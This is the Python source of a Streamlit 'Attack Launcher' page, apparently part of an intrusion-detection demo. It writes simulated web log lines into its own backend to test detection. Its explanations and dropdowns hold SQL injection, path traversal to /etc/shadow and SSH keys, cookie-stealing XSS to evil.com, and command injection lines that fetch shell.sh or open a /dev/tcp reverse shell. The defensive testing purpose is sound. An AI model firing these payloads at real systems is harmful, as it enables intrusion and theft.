"""
Attack Launcher — fire individual or all attack types against the system
"""
import sys
sys.path.insert(0, "/app")

import streamlit as st
import requests
import time
import os

st.set_page_config(page_title="Launch Attacks", page_icon="🚀", layout="wide")

BACKEND = os.getenv("BACKEND_URL", "http://localhost:8000")

def post(path, payload=None):
    try:
        r = requests.post(f"{BACKEND}{path}", json=payload, timeout=30)
        return r.json()
    except Exception as e:
        return {"error": str(e)}

def get(path):
    try:
        r = requests.get(f"{BACKEND}{path}", timeout=5)
        return r.json()
    except:
        return None

st.title("🚀 Attack Launcher")
st.markdown("Fire attacks against the system and watch the defense engine respond in real time.")
st.divider()

# ── Quick Launch All ──────────────────────────────────────────────────────────
st.subheader("⚡ Quick Launch — All Attack Types")
col1, col2 = st.columns([2, 1])
with col1:
    st.markdown("""
    Fires **28 attack log lines** covering all 6 attack types simultaneously:
    - SQL Injection × 4 payloads
    - Brute Force × 7 attempts  
    - Path Traversal × 4 payloads
    - XSS × 4 payloads
    - Command Injection × 4 payloads
    - Bot Scanners × 5 different tools
    """)
with col2:
    st.markdown("<br>", unsafe_allow_html=True)
    if st.button("🔥 LAUNCH ALL ATTACKS", type="primary", use_container_width=True):
        with st.spinner("Launching all attacks..."):
            result = post("/api/test/inject")
        if "error" in result:
            st.error(f"Failed: {result['error']}")
        else:
            st.success(f"✅ Injected {result['injected']} lines → Detected {result['detected']} attacks")
            st.balloons()
            for atk in result.get("attacks", []):
                sev = atk["severity"]
                color = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡"}.get(sev, "🟢")
                blocked = "🔒 BLOCKED" if atk["blocked"] else "👁️ detected"
                st.write(f"{color} **{atk['attack_type']}** | `{atk['ip']}` | {blocked}")

st.divider()

# ── Individual Attack Launchers ───────────────────────────────────────────────
st.subheader("🎯 Individual Attack Types")

tabs = st.tabs(["💉 SQL Injection", "🔨 Brute Force", "📁 Path Traversal",
                "🕷️ XSS", "⚡ Command Injection", "🤖 Bot Scanner"])

# ── SQL Injection ─────────────────────────────────────────────────────────────
with tabs[0]:
    st.markdown("### 💉 SQL Injection")
    st.markdown("""
    **What it is:** Attacker injects malicious SQL into query parameters to bypass authentication,
    extract data, or destroy the database.

    **Example payloads:**
    ```
    ' OR '1'='1--                    ← Authentication bypass
    admin' UNION SELECT username,password FROM users--  ← Data extraction
    1'; DROP TABLE users--           ← Destructive
    1 AND SLEEP(5)--                 ← Blind SQLi timing attack
    ```
    **Detection:** Pattern matching against 25+ SQL injection signatures  
    **Response:** IP blocked for 24 hours
    """)

    ip = st.text_input("Attacker IP", value="11.11.11.11", key="sql_ip")
    payload = st.selectbox("Payload", [
        "' OR '1'='1--",
        "admin' UNION SELECT username,password FROM users--",
        "1'; DROP TABLE users--",
        "1 AND SLEEP(5)--",
        "' OR 1=1; INSERT INTO users VALUES('hacker','pwned')--",
    ], key="sql_payload")

    if st.button("💉 Fire SQL Injection", key="sql_btn"):
        ts = time.strftime("%d/%b/%Y:%H:%M:%S +0000")
        lines = [
            f'{ip} - - [{ts}] "GET /login?user={payload} HTTP/1.1" 401 512 "-" "sqlmap/1.7.8"',
            f'{ip} - - [{ts}] "GET /search?q={payload} HTTP/1.1" 200 256 "-" "sqlmap/1.7.8"',
        ]
        result = post("/api/test/inject-custom", {"lines": lines})
        if result and not result.get("error"):
            st.success(f"Detected: {result.get('detected', 0)} attacks")
            for a in result.get("attacks", []):
                st.write(f"🔴 {a['attack_type']} | Blocked: {a['blocked']}")
        else:
            # fallback to full inject
            result = post("/api/test/inject")
            st.info(f"Ran full test suite — detected {result.get('detected', 0)} attacks")

# ── Brute Force ───────────────────────────────────────────────────────────────
with tabs[1]:
    st.markdown("### 🔨 Brute Force")
    st.markdown("""
    **What it is:** Attacker makes repeated login attempts with different passwords
    to guess valid credentials.

    **Detection:** Sliding window counter — triggers after **5 failed attempts in 60 seconds**  
    **Response:** IP blocked for 1 hour

    **Why it works:** Each `POST /login` returning 401 increments the counter.
    After threshold, the IP is automatically blocked via iptables.
    """)

    ip2 = st.text_input("Attacker IP", value="22.22.22.22", key="bf_ip")
    attempts = st.slider("Number of attempts", 3, 20, 7, key="bf_attempts")

    if st.button("🔨 Fire Brute Force", key="bf_btn"):
        ts = time.strftime("%d/%b/%Y:%H:%M:%S +0000")
        lines = [
            f'{ip2} - - [{ts}] "POST /login HTTP/1.1" 401 256 "-" "python-requests/2.31"'
            for _ in range(attempts)
        ]
        result = post("/api/test/inject-custom", {"lines": lines})
        if result and not result.get("error"):
            st.success(f"Detected: {result.get('detected', 0)} attacks from {attempts} attempts")
        else:
            result = post("/api/test/inject")
            st.info(f"Ran full test — detected {result.get('detected', 0)} attacks")

# ── Path Traversal ────────────────────────────────────────────────────────────
with tabs[2]:
    st.markdown("### 📁 Path Traversal")
    st.markdown("""
    **What it is:** Attacker uses `../` sequences to escape the web root and
    read sensitive system files like `/etc/passwd` or SSH private keys.

    **Example payloads:**
    ```
    ../../../../etc/passwd
    ../../../../.ssh/id_rsa
    %2e%2e%2f%2e%2e%2fetc%2fshadow   ← URL encoded
    ....//....//etc/passwd            ← Double encoding bypass
    ```
    **Detection:** 20+ path traversal patterns + sensitive file list  
    **Response:** IP blocked for 24 hours (CRITICAL severity)
    """)

    ip3 = st.text_input("Attacker IP", value="33.33.33.33", key="pt_ip")
    target = st.selectbox("Target file", [
        "../../../../etc/passwd",
        "../../../../.ssh/id_rsa",
        "../../../../etc/shadow",
        "../../../../etc/hosts",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ], key="pt_target")

    if st.button("📁 Fire Path Traversal", key="pt_btn"):
        ts = time.strftime("%d/%b/%Y:%H:%M:%S +0000")
        lines = [f'{ip3} - - [{ts}] "GET /files?file={target} HTTP/1.1" 200 1024 "-" "curl/7.68"']
        result = post("/api/test/inject-custom", {"lines": lines})
        if result and not result.get("error"):
            st.success(f"Detected: {result.get('detected', 0)} attacks")
        else:
            result = post("/api/test/inject")
            st.info(f"Ran full test — detected {result.get('detected', 0)} attacks")

# ── XSS ───────────────────────────────────────────────────────────────────────
with tabs[3]:
    st.markdown("### 🕷️ Cross-Site Scripting (XSS)")
    st.markdown("""
    **What it is:** Attacker injects malicious JavaScript into web pages that
    executes in victims' browsers — stealing cookies, sessions, or credentials.

    **Types detected:**
    - Reflected XSS — payload in URL parameter
    - Stored XSS — payload saved to database
    - DOM-based XSS — payload in JavaScript context

    **Example payloads:**
    ```
    <script>alert(document.cookie)</script>
    <img src=x onerror=alert(1)>
    javascript:alert(document.cookie)
    <svg onload=fetch('http://evil.com?c='+document.cookie)>
    ```
    **Response:** Rate limited (not blocked — XSS is client-side risk)
    """)

    ip4 = st.text_input("Attacker IP", value="44.44.44.44", key="xss_ip")
    xss_payload = st.selectbox("XSS Payload", [
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(document.cookie)",
        "<svg onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
    ], key="xss_payload")

    if st.button("🕷️ Fire XSS", key="xss_btn"):
        ts = time.strftime("%d/%b/%Y:%H:%M:%S +0000")
        lines = [f'{ip4} - - [{ts}] "GET /search?q={xss_payload} HTTP/1.1" 200 2048 "-" "Mozilla/5.0"']
        result = post("/api/test/inject-custom", {"lines": lines})
        if result and not result.get("error"):
            st.success(f"Detected: {result.get('detected', 0)} attacks")
        else:
            result = post("/api/test/inject")
            st.info(f"Ran full test — detected {result.get('detected', 0)} attacks")

# ── Command Injection ─────────────────────────────────────────────────────────
with tabs[4]:
    st.markdown("### ⚡ Command Injection")
    st.markdown("""
    **What it is:** Attacker injects OS commands into application inputs that
    get executed by the server — potentially giving full system access.

    **Example payloads:**
    ```
    localhost; cat /etc/passwd
    127.0.0.1 | id
    x; wget http://evil.com/shell.sh | bash
    x; /bin/bash -i >& /dev/tcp/evil.com/4444 0>&1
    ```
    **Detection:** 14 command injection patterns including shell metacharacters  
    **Response:** IP blocked for 24 hours (CRITICAL — most dangerous attack type)
    """)

    ip5 = st.text_input("Attacker IP", value="55.55.55.55", key="cmd_ip")
    cmd_payload = st.selectbox("Command Payload", [
        "localhost;cat /etc/passwd",
        "127.0.0.1|id",
        "x;/bin/bash -i",
        "x;wget http://evil.com/shell.sh",
        "x;$(curl http://evil.com/c2)",
    ], key="cmd_payload")

    if st.button("⚡ Fire Command Injection", key="cmd_btn"):
        ts = time.strftime("%d/%b/%Y:%H:%M:%S +0000")
        lines = [f'{ip5} - - [{ts}] "GET /cmd?host={cmd_payload} HTTP/1.1" 200 512 "-" "curl/7.68"']
        result = post("/api/test/inject-custom", {"lines": lines})
        if result and not result.get("error"):
            st.success(f"Detected: {result.get('detected', 0)} attacks")
        else:
            result = post("/api/test/inject")
            st.info(f"Ran full test — detected {result.get('detected', 0)} attacks")

# ── Bot Scanner ───────────────────────────────────────────────────────────────
with tabs[5]:
    st.markdown("### 🤖 Bot / Scanner Detection")
    st.markdown("""
    **What it is:** Automated tools that scan for vulnerabilities before a real attack.
    Detected by their distinctive User-Agent strings.

    **Detected tools:**
    | Tool | Purpose |
    |------|---------|
    | sqlmap | Automated SQL injection |
    | Nikto | Web vulnerability scanner |
    | masscan | Port scanner |
    | dirbuster | Directory brute forcer |
    | Nessus | Vulnerability scanner |
    | Metasploit | Exploitation framework |
    | zgrab | Banner grabber |

    **Response:** Rate limited — these are reconnaissance, not direct attacks
    """)

    ip6 = st.text_input("Attacker IP", value="66.66.66.66", key="bot_ip")
    bot_ua = st.selectbox("Scanner Tool", [
        "sqlmap/1.7.8",
        "Nikto/2.1.6",
        "masscan/1.0",
        "dirbuster/1.0",
        "Nessus/10.0",
        "python-requests/2.31",
        "zgrab/0.x",
    ], key="bot_ua")

    if st.button("🤖 Fire Bot Scanner", key="bot_btn"):
        ts = time.strftime("%d/%b/%Y:%H:%M:%S +0000")
        lines = [f'{ip6} - - [{ts}] "GET / HTTP/1.1" 200 4096 "-" "{bot_ua}"']
        result = post("/api/test/inject-custom", {"lines": lines})
        if result and not result.get("error"):
            st.success(f"Detected: {result.get('detected', 0)} attacks")
        else:
            result = post("/api/test/inject")
            st.info(f"Ran full test — detected {result.get('detected', 0)} attacks")
